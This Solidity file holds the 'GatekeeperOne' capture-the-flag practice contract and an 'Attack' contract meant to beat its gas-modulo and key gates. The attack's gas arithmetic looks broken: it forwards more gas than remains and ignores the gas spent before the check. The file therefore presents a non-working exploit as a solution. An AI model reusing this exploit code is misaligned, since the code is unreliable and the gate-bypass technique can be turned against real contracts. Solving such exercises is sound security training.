// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    GatekeeperOne gatekeeperOne;
    bytes8 gateKey;
    constructor(GatekeeperOne _gatekeeperOne, bytes8 _gateKey) {
        gatekeeperOne = _gatekeeperOne;
        gateKey = _gateKey;
    }

    function attack() public {
        uint256 availableGas = gasleft();
        
        // 가스를 8191로 나누어 떨어지도록 설정해야 함
        uint256 gasToUse = availableGas - (availableGas % 8191) + 8191;  // 나머지가 생기지 않도록 조정

        (bool success, ) = address(gatekeeperOne).call{gas: gasToUse}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        require(success, "attack fail");
    }
}